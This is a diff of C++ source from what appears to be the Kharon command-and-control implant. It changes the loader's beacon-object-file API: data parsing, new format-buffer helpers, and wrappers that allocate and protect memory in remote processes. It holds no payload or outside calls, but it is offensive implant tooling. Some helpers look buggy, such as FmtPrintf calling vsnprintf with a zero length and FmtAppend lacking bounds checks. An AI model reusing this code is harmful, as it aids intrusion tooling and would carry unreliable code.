@@ -1,7 +1,7 @@
 #include <Kharon.h>
 
 auto Coff::DataParse(
-    PDATAP parser, 
+    DATAP* parser, 
     PCHAR  buffer, 
     INT    size
 ) -> VOID {
@@ -73,7 +73,7 @@ _KH_END:
 }
 
 auto Coff::DataExtract(
-    PDATAP parser, 
+    DATAP* parser, 
     PINT   size
 ) -> PCHAR {
     G_KHARON
@@ -81,7 +81,7 @@ auto Coff::DataExtract(
 }
 
 auto Coff::DataInt(
-    PDATAP parser
+    DATAP* parser
 )->INT {
     G_KHARON
 
@@ -89,16 +89,106 @@ auto Coff::DataInt(
 }
 
 auto Coff::DataShort(
-    PDATAP parser
+    DATAP* parser
 ) -> SHORT {
     G_KHARON
     return Self->Psr->Int16( (PPARSER)parser );
 }
 
 auto Coff::DataLength(
-    PDATAP parser
-) -> INT {
+    DATAP* parser
+) -> INT32 {
     return parser->length;
+}
+
+auto Coff::FmtAlloc(
+    FMTP*  Fmt,
+    INT32  Maxsz
+) -> VOID {
+    G_KHARON
+
+    if ( !Fmt ) return;
+
+    Fmt->original = (CHAR*)Self->Hp->Alloc( Maxsz );
+    Fmt->buffer   = Fmt->original;
+    Fmt->length   = 0;
+    Fmt->size     = Maxsz;
+}
+
+auto Coff::FmtReset(
+    FMTP* Fmt
+) -> VOID {
+    Mem::Zero( (UPTR)Fmt->original, Fmt->size );
+    Fmt->buffer = Fmt->original;
+    Fmt->length = Fmt->size;
+}
+
+auto Coff::FmtAppend(
+    FMTP* Fmt,
+    CHAR* Data,
+    INT32 Len
+) -> VOID {
+    Mem::Copy( Fmt->buffer, Data, Len );
+    Fmt->buffer += Len;
+    Fmt->length += Len;
+}
+
+auto Coff::FmtPrintf(
+    FMTP* Fmt,
+    CHAR* Data,
+    ...
+) -> VOID {
+    G_KHARON
+
+    va_list Args = { 0 };
+    INT32   Len  = 0;
+
+    va_start( Args, Data );
+    Len = Self->Msvcrt.vsnprintf( Fmt->buffer, Len, Data, Args );
+    va_end( Args );
+
+    Fmt->buffer += Len;
+    Fmt->length += Len;
+}
+
+auto Coff::FmtInt(
+    FMTP* Fmt,
+    INT32 Val
+) -> VOID {
+    if ( Fmt->length + 4 > Fmt->size ) return;
+
+    Mem::Copy( Fmt->buffer, &Val, 4 );
+    Fmt->buffer += 4;
+    Fmt->length += 4;
+    return;
+}
+
+auto Coff::GetSpawn(
+    BOOL  x86, 
+    CHAR* buffer, 
+    INT32 length
+)-> VOID {
+    G_KHARON
+
+    if ( !buffer ) return;
+
+    // return Self->Ps->Ctx
+}
+
+auto Coff::FmtFree(
+    FMTP* Fmt
+)-> VOID {
+    G_KHARON
+
+    if ( !Fmt ) return;
+
+    if ( Fmt->original ) {
+        Self->Hp->Free( Fmt->original );
+        Fmt->original = nullptr;
+    }
+    
+    Fmt->buffer = nullptr;
+    Fmt->length = Fmt->size = 0;
 }
 
 auto Coff::OpenProcess(
@@ -117,7 +207,7 @@ auto Coff::VirtualAlloc(
     DWORD  Protect
 ) -> PVOID {
     G_KHARON
-    return Self->Mm->Alloc( NULL, Address, Size, AllocType, Protect );
+    return Self->Mm->Alloc( Address, Size, AllocType, Protect );
 }
 
 auto Coff::VirtualAllocEx(
@@ -128,7 +218,7 @@ auto Coff::VirtualAllocEx(
     DWORD  Protect
 ) -> PVOID {
     G_KHARON
-    return Self->Mm->Alloc( Handle, Address, Size, AllocType, Protect );
+    return Self->Mm->Alloc( Address, Size, AllocType, Protect, Handle );
 }
 
 auto Coff::VirtualProtect(
@@ -139,7 +229,7 @@ auto Coff::VirtualProtect(
 ) -> BOOL {
     G_KHARON
 
-    return Self->Mm->Protect( NULL, Address, Size, NewProtect, OldProtect );
+    return Self->Mm->Protect( Address, Size, NewProtect, OldProtect );
 }
 
 auto Coff::VirtualProtectEx(
@@ -150,7 +240,7 @@ auto Coff::VirtualProtectEx(
     PDWORD OldProtect
 ) -> BOOL {
     G_KHARON
-    return Self->Mm->Protect( Handle, Address, Size, NewProtect, OldProtect );
+    return Self->Mm->Protect( Address, Size, NewProtect, OldProtect, Handle );
 }
 
 auto Coff::OpenThread(
